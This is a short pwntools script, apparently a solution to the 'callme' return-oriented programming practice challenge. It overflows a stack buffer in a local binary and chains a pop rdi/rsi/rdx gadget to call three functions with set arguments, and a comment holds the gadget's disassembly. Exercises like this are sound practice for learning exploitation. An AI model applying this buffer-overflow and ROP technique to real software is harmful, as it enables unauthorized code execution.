from pwn import *

def pop():
    pop = ''
    pop += p64(0x0000000000401ab0)
    pop += p64(0x1)
    pop += p64(0x2)
    pop += p64(0x3)
    return pop

def exploit(payload):
    r = process('./callme')
    print "pidof ",util.proc.pidof(r)
    #pause()
    r.sendlineafter("> ", payload)
    r.interactive()

payload = "A" * 40
payload += pop()
payload += p64(0x401850) #callme one
payload += pop()
payload += p64(0x401870) #callme two
payload += pop()
payload += p64(0x401810) #callme three

exploit(payload)

#edx esi edi

'''
   0x0000000000401ab0 <+0>:     pop    rdi
   0x0000000000401ab1 <+1>:     pop    rsi
   0x0000000000401ab2 <+2>:     pop    rdx
   0x0000000000401ab3 <+3>:     ret    
   0x0000000000401ab4 <+4>:     nop    WORD PTR cs:[rax+rax*1+0x0]
   0x0000000000401abe <+14>:    xchg   ax,ax
'''




